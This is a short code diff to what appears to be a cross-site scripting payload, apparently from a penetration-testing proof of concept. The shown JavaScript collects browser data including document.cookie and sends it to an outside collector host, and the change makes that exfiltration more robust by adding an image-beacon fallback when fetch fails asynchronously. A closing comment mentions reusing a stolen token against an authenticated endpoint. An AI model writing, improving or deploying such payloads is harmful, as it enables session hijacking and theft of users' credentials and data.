@@ -50,11 +50,13 @@
     cookie: document.cookie
   };
 
-  // 1) Exfil the stored material to your collaborator
+  // 1) Exfil the stored material to your collaborator. fetch() rejects ASYNCHRONOUSLY (network/CSP), which a
+  //    try/catch does NOT catch — handle both the sync throw and the promise rejection, else the beacon is lost.
+  function lootFallback() { new Image().src = CFG.collector + "?d=" + encodeURIComponent(JSON.stringify(loot)); }
   try {
-    fetch(CFG.collector, { method: "POST", mode: "no-cors", body: JSON.stringify(loot) });
+    fetch(CFG.collector, { method: "POST", mode: "no-cors", body: JSON.stringify(loot) }).catch(lootFallback);
   } catch (e) {
-    new Image().src = CFG.collector + "?d=" + encodeURIComponent(JSON.stringify(loot));
+    lootFallback();
   }
 
   // 2) OPTIONAL impact demonstration: call an authed endpoint with the token and exfil the result.
